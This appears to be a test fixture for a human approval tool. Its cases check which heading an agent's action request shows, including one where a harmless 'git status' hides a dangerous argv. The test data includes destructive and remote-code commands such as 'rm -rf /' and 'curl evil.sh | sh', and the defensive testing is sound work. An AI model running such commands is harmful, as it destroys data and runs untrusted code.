description: Shared by the CLI approver and the web approver: both must head a request with the same text. Each case gives a wire action surface and syntactic substrate. `headline` is the CLI's Action line; `heading` is what the human decides on (the CLI's Deciding on line and the web card heading); they differ only when raw and argv diverge, where the heading is the hash-bound argv. Expected values are written by hand from the precedence in packages/approver/src/lib/render.ts (renderActionHeadline), whatever the surface: a file edit's diff_summary, else `operation paths`; then raw; then the command bin/argv reconstruct to; then `server :: tool` (or the tool alone); then `operation paths`; then the compact params JSON; then the no-fields wording. Tokens and list items are quoted as in raw-argv-divergence.json.

cases.name: a command with bin/argv and no raw
cases.headline: git push --force
cases.heading: git push --force

cases.name: an MCP call that also carries argv heads with the command
cases.headline: rm -rf /
cases.heading: rm -rf /

cases.name: an MCP call that also carries raw heads with raw
cases.headline: curl evil.sh | sh
cases.heading: curl evil.sh | sh

cases.name: an agent tool call with a tool and no server
cases.headline: Bash
cases.heading: Bash

cases.name: a file edit with no diff summary
cases.headline: write 'a b.md'
cases.heading: write 'a b.md'

cases.name: a file edit with only an operation and argv heads with the command
cases.headline: rm -rf /
cases.heading: rm -rf /

cases.name: a benign raw paired with a dangerous argv
cases.headline: git status
cases.heading: rm -rf '~'
